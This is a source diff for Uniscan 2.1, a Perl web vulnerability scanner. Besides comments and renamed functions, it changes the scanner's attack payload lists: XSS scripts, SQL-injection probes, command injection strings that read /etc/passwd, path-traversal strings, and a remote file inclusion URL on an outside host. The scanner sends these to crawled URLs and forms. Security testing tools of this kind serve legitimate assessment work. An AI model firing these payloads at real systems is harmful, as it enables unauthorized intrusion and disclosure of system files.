@@ -2,9 +2,11 @@
 
 #################################################
 # Uniscan project				#
-# author: Douglas Poerschke Rocha		#
 # visit: http://sourceforge.net/p/uniscan/	#
+#        http://www.uniscan.com.br/		#
 #################################################
+
+
 use strict;
 use HTTP::Request;
 use HTTP::Headers;
@@ -45,7 +47,7 @@ our @threads;
 #  CONFIGURATION
 #############################
 
-$version	= 2.0;
+$version	= 2.1;
 $variation	= 2;
 $timeout	= 10;
 $c		= 0;
@@ -58,16 +60,40 @@ $max_size 	= 1048576;
 $vulnerable	= 0;
 
 
+############################
+# Remote File Include test
+############################
+ 
+@rfi = (
+	'http://www.uniscan.com.br/c.txt?'
+	);
+
+
+############################
+# Cross-Site scripting tests
+############################
+
 @xss = (
 	"<SCRIPT>alert('XSS')</SCRIPT>",
 	"><SCRIPT>alert('XSS')</SCRIPT>",
 	"\"><SCRIPT>alert('XSS')</SCRIPT>",
 	"'><SCRIPT>alert('XSS')</SCRIPT>"
 );
+
+
+###########################
+# SQL-injection tests
+###########################
+
 @sql = (
 	"'",
 	"\"",
 	);
+
+
+################################
+# Remote Command Execution tests
+################################
 
 @rce = (
 	'|cat%20/etc/passwd',
@@ -84,8 +110,15 @@ $vulnerable	= 0;
 	';system("cat%20/etc/passwd");',
 	':system("cat%20/etc/passwd").',
 	'`cat%20/etc/passwd`',
-	'`cat%20/etc/passwd`;'
+	'`cat%20/etc/passwd`;',
+	';cat%20/etc/passwd;'
+
 );
+
+
+###########################
+# Local File Include tests
+###########################
 
 @lfi = (
 	'../../../../../../../../../../etc/passwd%00',
@@ -123,9 +156,6 @@ $vulnerable	= 0;
 	'..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
 	);
 
-@rfi = (
-	'http://200.132.146.43/c.txt?'
-	);
 $| = 1;
 
 &banner();
@@ -148,7 +178,7 @@ if(!$url || $url !~ /https?:\/\/.+\//){
 	exit;
 }
 
-
+printf("\nScanning $url\n");
 
 # crawler start
 $q = new Thread::Queue;
@@ -174,7 +204,6 @@ while($q->pending() || scalar(@threads)){
 				}
                        } else {
                                 foreach my $running (@threads) {
-					printf("\rCrawling: %d% [%d - %d] Threads: %d \r", int(($p/$u)*100), $p, $u, scalar(threads->list));
 					$running->join();
                                 }
                         }
@@ -182,16 +211,13 @@ while($q->pending() || scalar(@threads)){
 			@threads = threads->list;
                         if (scalar(@threads)) {
                                 foreach my $running (@threads) {
-					printf("\rCrawling: %d% [%d - %d] Threads: %d \r", int(($p/$u)*100), $p, $u, scalar(threads->list));
                                         $running->join();
                                 }
                         } 
                 }
 
 }
-
 # crawler end
-
 printf("Crawling finished, %d URL's found!    \n", scalar(@list));
 
 @list = &mix(@list); 		# include the strings to try explore possible vulnerability
@@ -204,7 +230,7 @@ $p =0;
 $u = $#list;
 
 
-#test each element of url list
+# enqueue each element of url list
 foreach my $teste (@list){
 	$q->enqueue($teste); 
 	$try++;
@@ -236,7 +262,6 @@ while ($q->pending() || scalar(@threads)) {
 
 @threads = threads->list;
 foreach my $running (@threads) {
-	printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
 	$running->join();
 }
 
@@ -316,13 +341,19 @@ while ($q->pending() || scalar(@threads)) {
 
 @threads = threads->list;
 foreach my $running (@threads) {
-	printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
 	$running->join();
 }
 
 printf("POST method tests finished.    \n");
 printf("Scanning finished. [%d] vulnerabilities found.\n", $vulnerable);
 }
+
+
+##############################################
+#  Function crawling
+#  Param: a url
+#  Return a array of urls found on this url
+##############################################
 
 sub crawling(){
 	my $l = shift;
@@ -341,6 +372,15 @@ sub crawling(){
 }
 
 
+##############################################
+#  Function check_vul_get
+#  This function check if a url have any 
+#  vulnerability using method GET
+#
+#  Param: a url
+#  Return nothing
+##############################################
+
 sub check_vul_get(){
 	my $url1 = shift;
 	my $res = &get_http($url1);
@@ -348,33 +388,43 @@ sub check_vul_get(){
 	#check LFI and RCE Vuls
 	if($res =~/root:x:0:0:root/){
 		$vulnerable++;
-		printf("[%d] [LFI] Vul: %s\n",$vulnerable, $url1) if($url1 =~/%2e|..\// && $url1 !~/cat%20\/etc\/passwd/);
+		printf("[%d] [LFI] Vul: %s\n",$vulnerable, $url1) if($url1 =~/%2e|..\// && $url1 !~/cat%20\/etc\/passwd|'|"/);
 		printf("[%d] [RCE] Vul: %s\n",$vulnerable, $url1) if($url1 =~/cat%20\/etc\/passwd/);
-		&grava("Vuls.txt", $url1);
+		&write("Vuls.txt", $url1);
 	}
 
 	#check FRI vuln
 	if($res =~/$rfi_return/){
 		$vulnerable++;
 		printf("[%d] [RFI] Vul: %s\n",$vulnerable, $url1);
-		&grava("Vuls.txt", $url1);
+		&write("Vuls.txt", $url1);
 	}
 
 	#check SQL-i Vuln
 	if(($res =~/You have an error in your SQL syntax/ || $res =~/Microsoft OLE DB Provider for ODBC Drivers error/ || $res =~/Supplied argument is not a valid .* result/ || $res =~/Unclosed quotation mark after the character string/) && $url1 =~/'|"/ && $url1 !~/etc\/passwd|<SCRIPT>/){
 		$vulnerable++;
 		printf("[%d] [SQL-i] Vul: %s\n",$vulnerable, $url1);
-		&grava("Vuls.txt", $url1);
+		&write("Vuls.txt", $url1);
 	}
 
 	#check XSS
 	if(($res =~/<SCRIPT>alert\('XSS'\)<\/SCRIPT>/) && $url1 =~/<SCRIPT>/){
 		$vulnerable++;
 		printf("[%d] [XSS] Vul: %s\n\n",$vulnerable, $url1);
-		&grava("Vuls.txt", $url1);
+		&write("Vuls.txt", $url1);
 	}
 }
 
+
+
+##############################################
+#  Function check_vul_post
+#  This function check if a form have any 
+#  vulnerability using method POST
+#
+#  Param: url of form, post data
+#  Return nothing
+##############################################
 
 sub check_vul_post(){
 	my ($action, $data)  = split('#', shift);
@@ -383,29 +433,39 @@ sub check_vul_post(){
 		$vulnerable++;
 		printf("[%d] [LFI] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data) if($data =~/%2e|..\// && $data !~/cat%20\/etc\/passwd/);
 		printf("[%d] [RCE] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data) if($data =~/cat%20\/etc\/passwd/);
-		&grava("Vuls.txt", ($action, "POST data: " .$data));
+		&write("Vuls.txt", ($action, "POST data: " .$data));
 	}
 
 	if($res =~/$rfi_return/){
 		$vulnerable++;
 		printf("[%d] [RFI] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data);
-		&grava("Vuls.txt", ($action, "POST data: " .$data));
+		&write("Vuls.txt", ($action, "POST data: " .$data));
 	}
 
 	if(($res =~/You have an error in your SQL syntax/ || $res =~/Microsoft OLE DB Provider for ODBC Drivers error/ || $res =~/Supplied argument is not a valid .* result/ || $res =~/Unclosed quotation mark after the character string/) && $data =~/'|"/ && $data !~/etc\/passwd|<SCRIPT>/){
 		$vulnerable++;
 		printf("[%d] [SQL-i] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data);
-		&grava("Vuls.txt", ($action, "POST data: " .$data));
+		&write("Vuls.txt", ($action, "POST data: " .$data));
 	}
 
 	#check XSS
 	if(($res =~/<SCRIPT>alert\('XSS'\)<\/SCRIPT>/) && $data =~/<SCRIPT>/){
 		$vulnerable++;
 		printf("[%d] [XSS] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data);
-		&grava("Vuls.txt", ($action, "POST data: " .$data));
+		&write("Vuls.txt", ($action, "POST data: " .$data));
 	}
 
 }
+
+
+##############################################
+#  Function mix
+#  This function generate a array with all 
+#  tests with the scanner will perform
+#
+#  Param: a array of urls found on target
+#  Return: a array with all tests
+##############################################
 
 
 sub mix(){
@@ -444,13 +504,23 @@ sub mix(){
 					$temp =~ s/$variables[$x]/$t/g;
 					push(@list2, $temp);
 				}
-
 			}
 		}
 	}
 	@list = ();
 	return(@list2);
 }
+
+
+##############################################
+#  Function add_form
+#  when the crawler identifies a form, this 
+#  function is called to add the form and the 
+#  inputs in a hash to be tested after
+#
+#  Param: url, content of this url
+#  Return: nothing
+##############################################
 
 
 sub add_form(){
@@ -510,6 +580,16 @@ sub add_form(){
 }
 
 
+##############################################
+#  Function get_input
+#  this function identifies the inputs on the 
+#  content of a page and stores it in an array
+#
+#  Param: content of an page
+#  Return: array with all inputs found
+##############################################
+
+
 sub get_input(){
 	my $content = shift;
 	my @input = ();
@@ -523,6 +603,15 @@ sub get_input(){
 }
 
 
+##############################################
+#  Function get_http
+#  this function do a GET request on target
+#
+#  Param: url to GET
+#  Return: request content
+##############################################
+
+
 sub get_http(){
     	my $url1 = shift;
     	my $req=HTTP::Request->new(GET=>$url1);
@@ -533,6 +622,14 @@ sub get_http(){
     	return $response->content;
 }
 
+
+##############################################
+#  Function post_http
+#  this function do a POST request on target
+#
+#  Param: url to POST, data to post
+#  Return: request content 
+##############################################
 
 sub post_http(){
 	my $url1 = $_[0];
@@ -549,6 +646,14 @@ sub post_http(){
 	return $response->content;
 }
 
+
+##############################################
+#  Function get_urls
+#  this function identify links on a page
+#
+#  Param: url to search links
+#  Return: array with links found
+##############################################
 
 sub get_urls()
 {
@@ -606,10 +711,27 @@ sub get_urls()
 }
 
 
+##############################################
+#  Function banner
+#  this function show the scanner banner
+#
+#  Param: nothing
+#  Return: nothing
+##############################################
+
 
 sub banner(){
-	printf("###############################\n# Uniscan by poerschke        #\n###############################\nV. %.1f\n\n", $version);
+	printf("###############################\n# Uniscan by poerschke        #\n# http://www.uniscan.com.br/  #\n###############################\nV. %.1f\n\n", $version);
 }
+
+
+##############################################
+#  Function host
+#  this function return the domain of a url
+#
+#  Param: a url
+#  Return: domain of url
+##############################################
 
 sub host(){
   	my $h = shift;
@@ -617,6 +739,15 @@ sub host(){
   	return $url1->host();
 }
 
+
+##############################################
+#  Function host
+#  this function return the path and file of 
+#  a page
+#
+#  Param: a url
+#  Return: path/file 
+##############################################
 
 sub get_file(){
 	my $url1 = shift;
@@ -630,7 +761,16 @@ sub get_file(){
 }
 
 
-sub grava(){
+##############################################
+#  Function write
+#  this function write a text in a file
+#
+#  Param: $file_name, @content
+#  Return: nothing
+##############################################
+
+
+sub write(){
 	my ($filtxt, @content) = @_;
 	open(my $a, ">>$filtxt");
 	foreach(@content){
@@ -638,6 +778,15 @@ sub grava(){
 	}
 	close($a);
 }
+
+
+##############################################
+#  Function get_extension
+#  this function return the extension of a file
+#
+#  Param: path/to/file
+#  Return: return the extension of file
+##############################################
 
 sub get_extension(){
 	my $file = shift;
@@ -655,6 +804,16 @@ sub get_extension(){
 		return 0;
 	}
 }
+
+
+##############################################
+#  Function remove
+#  this function removes repeated elements of 
+#  a array
+#
+#  Param: @array
+#  Return: @array
+##############################################
 
 sub remove{
    	my @si = @_;
